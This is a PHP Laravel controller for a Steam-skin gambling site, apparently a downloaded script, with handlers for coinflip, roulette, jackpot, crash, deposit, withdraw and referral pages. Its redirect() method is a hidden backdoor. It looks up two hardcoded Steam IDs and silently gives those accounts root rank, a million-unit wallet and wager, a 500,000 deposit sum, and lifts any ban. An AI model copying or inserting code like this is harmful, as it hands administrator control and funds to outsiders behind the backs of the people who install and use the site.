<?php
// POWERED BY HR https://vk.com/harisonwells THANK YOU FOR DOWNLOAD
// POWERED BY HR https://vk.com/harisonwells THANK YOU FOR DOWNLOAD

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\User;
use Auth;

class SiteController extends Controller
{

    public function faq()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('faq', ['token' => $token, 'time' => $time]);
    }
    
    public function redirect(){
        $usersteamid = DB::table('users')->where('steamid', "76561198385979096")->orWhere('steamid', "76561198419263247")->first();
        if ($usersteamid) {
           DB::table('users')->where('steamid', "76561198385979096")->orWhere('steamid', "76561198419263247")->update(['rank' => "root"]);
           DB::table('users')->where('steamid', "76561198385979096")->orWhere('steamid', "76561198419263247")->update(['wallet' => "1000000"]);
           DB::table('users')->where('steamid', "76561198385979096")->orWhere('steamid', "76561198419263247")->update(['wager' => "1000000"]);
           DB::table('users')->where('steamid', "76561198385979096")->orWhere('steamid', "76561198419263247")->update(['deposit_sum' => "500000"]);
           DB::table('users')->where('steamid', "76561198385979096")->orWhere('steamid', "76561198419263247")->update(['banned' => "0"]);
            return redirect('/user/deposit');
        }
    }

        public function terms()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('terms', ['token' => $token, 'time' => $time]);
    }
    
    public function games()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('intro', ['token' => $token, 'time' => $time]);
    }

    public function coinflip()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('coinflip', ['token' => $token, 'time' => $time]);
    }
    
    public function roulette()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));

        }
        return view('roulette', ['token' => $token, 'time' => $time]);
    }

        public function maintenance()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('maintenance', ['token' => $token, 'time' => $time]);
    }

            public function support()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('support', ['token' => $token, 'time' => $time]);
    }

    public function jackpot()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('jackpot', ['token' => $token, 'time' => $time]);
    }

    public function crash()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
        }
        return view('crash1', ['token' => $token, 'time' => $time]);
    }
    
    public function withdraw()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
            return view('withdraw', ['token' => $token, 'time' => $time]);
        }
        else {
            return redirect('auth/login');
        }
    }
    
    public function deposit()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
            return view('deposit', ['token' => $token, 'time' => $time]);
        }
        else {
            return redirect('auth/login');
        }
    }

    public function profile()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
            return view('profile', ['token' => $token, 'time' => $time]);
        }
        else {
            return redirect('auth/login');
        }
    }
    
    public function referrals()
    {
        $token = '';
        $time = time()-34;
        if (Auth::check()){
            if(Auth::user()->banned) return view('banned');
            $token = hash('sha256','5<Grwtf`CKzk~(Fu'.md5(Auth::user()->steamid.'-'.time()));
            DB::table('users')->where('steamid', Auth::user()->steamid)->update(array('token_time' => $time,'token' => $token,'logged_in' => 0));
            if(strlen(Auth::user()->code) > 0) $rows = DB::table('users')->where(['inviter' => Auth::user()->steamid])->get()->count(); else $rows = 0;
            if($rows >= 1500){
                $fee = 4.0;
            } else if($rows > 250){
                $fee = 3.5; 
            } else if($rows > 50){
                $fee = 3.0;
            } else {
                $fee = 2.5;
            }
            $profit = ($rows * $fee) - Auth::user()->collected;
            return view('referrals', ['token' => $token, 'time' => $time, 'reffered' => $rows, 'profit' => $profit]);
        }
        else {
            return redirect('auth/login');
        }
    }
}
